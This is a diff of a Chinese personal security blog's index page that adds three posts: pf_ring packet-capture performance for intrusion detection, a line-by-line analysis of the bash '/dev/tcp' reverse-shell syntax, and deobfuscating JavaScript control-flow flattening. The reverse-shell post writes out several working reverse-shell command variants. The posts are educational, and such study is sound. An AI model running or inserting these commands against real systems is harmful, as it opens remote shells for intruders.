@@ -125,7 +125,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">60</span>
+          <span class="site-state-item-count">62</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -159,6 +159,369 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%85%A8%E6%B5%81%E9%87%8F%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E5%85%A8%E6%B5%81%E9%87%8F%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">全流量入侵检测系统的性能分析</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>16年在房多多的时候参与开发nids，用<a target="_blank" rel="noopener" href="https://github.com/bro/bro">bro</a>来做抓包、解包和规则引擎。</p>
+<p>当时对bro解析http的成功率做测试，生产环境中发现差不多有10%-20%的http请求并没有解析成功。</p>
+<p>我当时的测试思路如下：</p>
+<ul>
+<li>客户端发送http请求，请求中带有特殊标记</li>
+<li>统计bro http日志中有带有标记的数量</li>
+</ul>
+<p>10%-20%的解析失败，意味着有可能有攻击行为没有检测到。因此需要提升http流量解析的成功率。</p>
+<p>当时在网上也搜到一些提升抓包性能的方案，比如pf_ring、dpdk等。不过当时理解不了原理，最近补了一些网络方面的知识，所以就来回顾一下这个案例。</p>
+<p>我主要想弄清楚以下问题：</p>
+<ul>
+<li>pf_ring真的能提高抓包性能么？</li>
+<li>pf_ring为什么能提高性能？</li>
+</ul>
+<p>基于以下两点原因，本文只讨论pf_ring、不讨论dpdk：</p>
+<ul>
+<li>端口扫描工具masscan支持pf_ring，而不支持dpdk。我后面要分析masscan</li>
+<li>精力有限，而pf_ring技术点比dpdk似乎要少一些、简单一点</li>
+</ul>
+<p>另外本文只讨论 <a target="_blank" rel="noopener" href="https://www.ntop.org/pf_ring/pf_ring-and-transparent-mode/">pf_ring的三种模式</a> 中的默认模式</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
+<li><p>先理解一下”问题背景”里场景的性能</p>
+<p>从网卡上的流量到bro将http请求写到日志中，可以大概分成三个部分：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 抓包（包从网卡到用户空间）</span><br><span class="line">* 解包（解析出http、dns、ssh、ftp等应用层协议）</span><br><span class="line">* 写磁盘</span><br></pre></td></tr></table></figure>
+
+<p>这每一步都会有性能损耗，但是性能损耗的占比可能不同。所以仅提升”抓包”这一部分的性能有可能并不能提升整体性能。</p>
+<p>用一些性能工具（比如perf）结合代码 应该可以看出来bro每个阶段的cpu消耗占比。</p>
+<p>这篇文章只关注”抓包”这个环节的性能。</p>
+</li>
+<li><p>为什么会丢包？</p>
+<p>丢包的原因太多了，在<code>网络传输 -&gt; 网卡 -&gt; 驱动 -&gt; 内核sk_buff -&gt; tcp/ip协议栈 -&gt; 用户态</code>每一个环节都有可能丢包。</p>
+<p>可以看 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/256428917">图解Linux网络包接收过程</a> 这篇文章了解完整的收包过程。</p>
+<p>关于”排查各个环节丢包的工具和思路”，由于没有实践过多少，这里就不推荐啥文章了。</p>
+</li>
+<li><p>抓包过程中的性能和哪些因素有关？</p>
+<p>目前我理解的主要和三个方面有关：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 内存拷贝的次数</span><br><span class="line">* 内核处理网卡中断的频率</span><br><span class="line">* 系统调用产生的中断次数</span><br></pre></td></tr></table></figure>
+
+<p>所以pf_ring做了以下事情：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 通过mmap映射，减少了一次内存拷贝</span><br><span class="line">* 通过napi机制减少内核响应网卡硬中断的次数</span><br><span class="line">* 也因为mmap映射，用户层不需要频繁地通过recvfrom等系统调用获取网络包</span><br></pre></td></tr></table></figure>
+
+<p>如果想了解mmap怎么实现内核态和用户态的内存映射，可以参考 <a target="_blank" rel="noopener" href="https://nieyong.github.io/wiki_cpu/mmap%E8%AF%A6%E8%A7%A3.html">文章中的示例1</a> ，有demo代码可以跑起来。</p>
+<p>pf_ring的实现方式和文章中的差不多：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 内核同样会注册mmap函数供用户态调用</span><br><span class="line">* 内核同样会调用&#96;remap_pfn_range&#96;函数来做内存映射</span><br></pre></td></tr></table></figure>
+
+<p>如果想了解napi机制，可以看 <a target="_blank" rel="noopener" href="https://wiki.linuxfoundation.org/networking/napi">napi官方文档</a>。</p>
+<p>我对napi的理解：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 它的作用是：将包从网卡放到内核内存</span><br><span class="line">* 如果每次都是网卡产生中断告诉cpu有数据包来了，在流量大的请求下就需要响应中断很多次。napi减少了硬中断的响应次数，所以提升了性能。</span><br><span class="line">* 它由内核驱动实现</span><br></pre></td></tr></table></figure>
+
+<p>如果想了解napi和非napi的实现上的区别，可以参考 <a target="_blank" rel="noopener" href="http://www.hyuuhit.com/2018/07/25/receive-packet/">Linux kernel 链路层帧接收</a> 并对照内核源码分析。此文章简要分析了两个驱动，分别代表了napi实现和非napi实现。</p>
+</li>
+<li><p>pf_ring真的可以提高libpcap性能么？</p>
+<p>新版本的libpcap采用PACKET_MMAP方式收包。</p>
+<p>PACKET_MMAP是内核实现的一种机制,发包和收包都可以用这个技术。它同样使用<code>mmap</code>减少了内存拷贝和系统调用，因此提升了性能。</p>
+<p>PACKET_MMAP的详细介绍推荐看<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/Documentation/networking/packet_mmap.rst">内核文档</a>，写得比较全（内容比较多，我也没完整过一遍）。</p>
+<p>我对”基于pf_ring非零拷贝的libpcap”和”基于packet_mmap的libpcap”对比，结论如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 两者内存拷贝次数一样</span><br><span class="line">* 两者使用相同的驱动，都用到了napi</span><br><span class="line">* 用户态读数据时，基本都不需要经过系统调用</span><br></pre></td></tr></table></figure>
+
+<p>根据这个对比，我觉得”pf_ring非零拷贝模式”应该不会大幅度提高抓包性能。</p>
+<p>为了验证自己的结论，就做个实验来看看。</p>
+</li>
+<li><p>实验验证</p>
+<p>在自己实验前，看到 <a target="_blank" rel="noopener" href="http://cea.ceaj.org/CN/article/downloadArticleFile.do?attachType=PDF&id=30309">PF_RING与NAPI结合的捕包性能优化和仿真.pdf</a> 这篇实践文章，推荐阅读。此文章结论是pf_ring可以提高抓包性能</p>
+<p>我做的实验过程见公众号中另一篇文章”验证pf_ring性能”，结论是pf_ring可以提高抓包成功率。</p>
+<p>实验结果上虽然可以看出来提高抓包成功率，但是看不出来是否有大幅度提升。</p>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>实验的结论和我自己对原理的分析并没有对应上，也并没有完全解决我自己一开始想弄清楚的问题。</p>
+<p>因为文章中的很多技术我在研究案例之前不怎么知道，另外也没有找到搞网络的大佬愿意帮我校对文章，所以不能保证文章中的结论都是对的。</p>
+<p>如果读者发现有什么错误的地方，请公众号后台私信我。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/" class="post-title-link" itemprop="url">分析bash反弹shell的语法</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>对下面的反弹shell语法细节有些模糊，故分析一下。</p>
+<p>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
+<li><p>-i 参数</p>
+<p>  生成交互式shell</p>
+</li>
+<li><p><code>&gt;&amp;</code> 是什么？</p>
+<p>  bash中<code>&gt;&amp;</code>语法比较特殊，有两种解释：</p>
+<ul>
+<li><p>后面接数字时，如<code>&gt;&amp;1</code>表示复制文件描述符</p>
+</li>
+<li><p>后面接非数字时，如<code>&gt;&amp;xxx</code>表示标准输入和标准输出重定向</p>
+<p>可以查看<code>man bash</code>手册，有详细介绍。</p>
+<p>在这个反弹shell中，第一个<code>&gt;&amp;</code>含义是 把标准输入和标准输出重定向到socket</p>
+</li>
+</ul>
+</li>
+<li><p><code>/dev/tcp/127.0.0.1/2222</code> 是什么？</p>
+<p>  它不是文件，只是bash解释器会对/dev/tcp对特殊处理，代表了一个tcp socket。</p>
+<p>  所以如果其他的sh解释器，如zsh、ksh等没有这个特殊解释时，就不能用这个来打开socket。</p>
+<p>  更详细的可以看参考资料</p>
+</li>
+<li><p><code>0&gt;&amp;1</code> 是什么？</p>
+<p>  将标准输入重定向到标准输出</p>
+</li>
+<li><p>“&gt;&amp; /dev/tcp/127.0.0.1/2222”  为什么不是 “&gt; /dev/tcp/127.0.0.1/2222”？</p>
+<p>  bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
+<p>  其实是可以的，不过这样标准错误就没有重定向到socket。可以通过查看 /proc/{pid}/fd/ 验证</p>
+</li>
+</ul>
+<p>根据上面的了解，可以推导出 这个反弹shell会将自己的标准输入、标准输出、标准错误全部重定向到同一个socket。</p>
+<h1 id="动手实验"><a href="#动手实验" class="headerlink" title="动手实验"></a>动手实验</h1><ol>
+<li><p>验证<code>&gt;&amp;</code>语法</p>
+<p> <code>&amp;&gt;</code>是一种特殊情况</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;111   因为 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;复制文件描述符&quot;来执行。执行命令时因为不存在111文件描述符，所以报错</span><br><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;xxx   因为不是 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;重定向标准输出和标准错误&quot;来执行</span><br><span class="line"></span><br><span class="line">执行结果，只有xxx文件，没有111文件</span><br><span class="line">[root@instance-fj5pftdp t]# ls</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure></li>
+<li><p>验证 文件描述符指向 socket</p>
+<p> 执行<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>后的文件描述符指向了同一个socket</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ls -al &#x2F;proc&#x2F;4961&#x2F;fd&#x2F;</span><br><span class="line">总用量 0</span><br><span class="line">dr-x------ 2 root root  0 2月  19 11:26 .</span><br><span class="line">dr-xr-xr-x 9 root root  0 2月  19 11:26 ..</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 0 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 1 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:26 2 -&gt; socket:[201270351]</span><br></pre></td></tr></table></figure>
+
+<p> 如果执行<code>bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>，标准错误描述符就不会指向socket</p>
+<p> 另外命令中需要注意到空格，”[n]&gt;&amp;word”可以写成”[n]&gt;&amp; word”，不可以写成”[n] &gt;&amp;word”</p>
+<p> 比如下面命令反弹shell会有些问题</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1 &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0 &gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p> 而下面命令可以反弹shell</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i 1&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp; 1</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;2</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要还是学习bash相关知识点，包括：</p>
+<ul>
+<li>“&gt;&amp;”的两种用法</li>
+<li>“/dev/tcp/127.0.0.1/2222” 不是文件，而是bash解释器对其特殊处理</li>
+</ul>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f10736931b93">【bash】关于 /dev/tcp/${HOST}/${PORT}</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/80d6b5a61372">Bash /dev/(tcp|udp)/${HOST}/${PORT} 分析</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%8F%8D%E6%B7%B7%E6%B7%86%22%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96%22/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E5%8F%8D%E6%B7%B7%E6%B7%86%22%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96%22/" class="post-title-link" itemprop="url">反混淆"控制流平坦化"</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>业务逻辑非常依赖前端的安全产品，比如<a target="_blank" rel="noopener" href="https://www.geetest.com/">极验</a>、<a target="_blank" rel="noopener" href="https://www.dingxiang-inc.com/docs/detail/captcha">顶象-无感验证</a>、瑞数 等都会对前端代码做混淆。其中有一种强度较高的混淆方式，叫”控制流平坦化”。</p>
+<blockquote>
+<p>“控制流平坦化”是将一些顺序执行的代码，变化成阅读难度更大的<code>while-switch-case</code>或者<code>for-switch-case</code>代码。可以见<a target="_blank" rel="noopener" href="https://github.com/Tsaiboss/ControlFlow">ControlFlow</a>这个项目的例子。</p>
+</blockquote>
+<p>如果能够”反混淆”这种”控制流平坦化”混淆后的代码，就能让代码变得更容易阅读一些。</p>
+<p>本文介绍”反控制流平坦化”的思路和实践过程，最终可以反混淆<code>ControlFlow</code>和<code>https://obfuscator.io/</code>两个工具的”控制流平坦化”。</p>
+<p>反混淆思路：</p>
+<ul>
+<li>按照”while-switch-case”执行顺序，拼接case语句</li>
+</ul>
+<h1 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h1><ul>
+<li><p>怎么实现？</p>
+<p>分为两步：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 第一步获取case块的执行顺序</span><br><span class="line">* 第二部根据case块的执行顺序，拼接case块</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>怎么获取”case块的执行顺序”？</p>
+<p>思路是在每个case块中”注入代码”，然后在浏览器中执行js代码，执行过程”注入代码”就可以记录执行顺序。我理解这个类似”软件测试”中计算”代码覆盖率”时用到的插桩。</p>
+<p>原始代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">while (!![])&#123;</span><br><span class="line">  switch (...)&#123;</span><br><span class="line">    case &quot;0&quot;:</span><br><span class="line">      ...</span><br><span class="line">    case &quot;1&quot;:</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>插桩后,代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 利用&quot;插桩&quot;记录while-switch-case执行顺序</span><br><span class="line">&#x2F;&#x2F; 集合 &#x3D; &#123;while id: [case1节点, case2节点，case3节点，case2节点]&#125;</span><br><span class="line"></span><br><span class="line">let while_id_stack &#x3D; []  &#x2F;&#x2F; 栈</span><br><span class="line"></span><br><span class="line">let collection &#x3D; &#123;&#125;</span><br><span class="line"></span><br><span class="line">while (!![])&#123;</span><br><span class="line">  while_statement_id &#x3D; 111</span><br><span class="line">  while_id_stack.push(while_statement_id)</span><br><span class="line">  collection[while_statement_id] &#x3D; []</span><br><span class="line"></span><br><span class="line">  switch (...)&#123;</span><br><span class="line">    case &quot;0&quot;:</span><br><span class="line">      case_statement_id &#x3D; 222</span><br><span class="line">      while_id_on_stack_op &#x3D; while_id_stack[while_id_stack.length-1]</span><br><span class="line">      collection[while_id_on_stack_op].push(case_statement_id)</span><br><span class="line">      ...</span><br><span class="line">    case &quot;1&quot;:</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  while_id_stack.pop()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">record(collection)</span><br></pre></td></tr></table></figure>
+
+<p>浏览器运行后，集合中就存放有case节点的执行顺序。</p>
+<p>上面都是伪代码，具体实现见 hook.js</p>
+</li>
+<li><p>怎么拼接case块？</p>
+<p>伪代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">集合 &#x3D; &#123;while id: [case1节点, case2节点，case3节点，case2节点]&#125;</span><br><span class="line"></span><br><span class="line">函数1：</span><br><span class="line"></span><br><span class="line">  遍历ast，如果遇到while语句 &#123;</span><br><span class="line">    得到当前while id</span><br><span class="line"></span><br><span class="line">    if while id in 集合:</span><br><span class="line">      顺序拼接各个case块内容</span><br><span class="line"></span><br><span class="line">      用&quot;拼接后的顺序语句&quot;替换&quot;while语句&quot;</span><br><span class="line"></span><br><span class="line">      从集合中删除 while id记录</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">while 集合中还有元素:</span><br><span class="line"></span><br><span class="line">  调用 函数1</span><br></pre></td></tr></table></figure>
+
+<p>具体实现见 simple_decode.js</p>
+</li>
+</ul>
+<h1 id="实现结果"><a href="#实现结果" class="headerlink" title="实现结果"></a>实现结果</h1><p>可以将”while-switch-case代码块”变成”顺序执行的代码块”。</p>
+<p>比如 PlayWithObfuscator/tests/encoded_js/simple.js 中的混淆后的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">while (!![]) &#123;</span><br><span class="line">    switch (_0xcgcd3c[_0x3922ce++]) &#123;</span><br><span class="line">        case &quot;0&quot;:</span><br><span class="line">            if (_0x33g15b &#x3D; _0x5153cd.charCodeAt(_0xeea791 +&#x3D; .75), _0x33g15b &gt; 255) throw new t(&quot;&#39;btoa&#39; failed: The string to be encoded contains characters outside of the Latin1 range.&quot;);</span><br><span class="line">            continue;</span><br><span class="line"></span><br><span class="line">        case &quot;1&quot;:</span><br><span class="line">            _0xed1fcd &#x3D; _0xed1fcd &lt;&lt; 8 | _0x33g15b;</span><br><span class="line">            continue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>转换成 阅读性更好一些的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (_0x33g15b &#x3D; _0x5153cd.charCodeAt(_0xeea791 +&#x3D; .75), _0x33g15b &gt; 255) throw new t(&quot;&#39;btoa&#39; failed: The string to be encoded contains characters outside of the Latin1 range.&quot;);</span><br><span class="line">_0xed1fcd &#x3D; _0xed1fcd &lt;&lt; 8 | _0x33g15b;</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>目前属于demo阶段，可以对以下工具的”控制流平坦化”做反混淆：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://obfuscator.io/">https://obfuscator.io/</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Tsaiboss/ControlFlow">https://github.com/Tsaiboss/ControlFlow</a></li>
+</ul>
+<p>测试结果在 <a target="_blank" rel="noopener" href="https://github.com/leveryd/PlayWithObfuscator/tree/main/tests">tests目录</a> 看到</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a314131070/article/details/106567825?spm=1001.2014.3001.5501">JS反混淆-控制流平展（一）</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -399,116 +762,6 @@
 <p>但是如果直接<code>cat /proc/&#123;pid&#125;/exe</code>，就会发现仍然可以读到源二进制程序内容。</p>
 <p>那怎么让<code>/proc/&#123;pid&#125;/exe</code>也无法还原出二进制程序呢，这个问题留给读者思考。</p>
 <p>本文提到的手段没有在真实的对抗中实践过，仅仅是我自己的研究，欢迎与我交流。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%8F%8D%E6%B7%B7%E6%B7%86%22%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96%22/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%8F%8D%E6%B7%B7%E6%B7%86%22%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96%22/" class="post-title-link" itemprop="url">反混淆"控制流平坦化"</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>业务逻辑非常依赖前端的安全产品，比如<a target="_blank" rel="noopener" href="https://www.geetest.com/">极验</a>、<a target="_blank" rel="noopener" href="https://www.dingxiang-inc.com/docs/detail/captcha">顶象-无感验证</a>、瑞数 等都会对前端代码做混淆。其中有一种强度较高的混淆方式，叫”控制流平坦化”。</p>
-<blockquote>
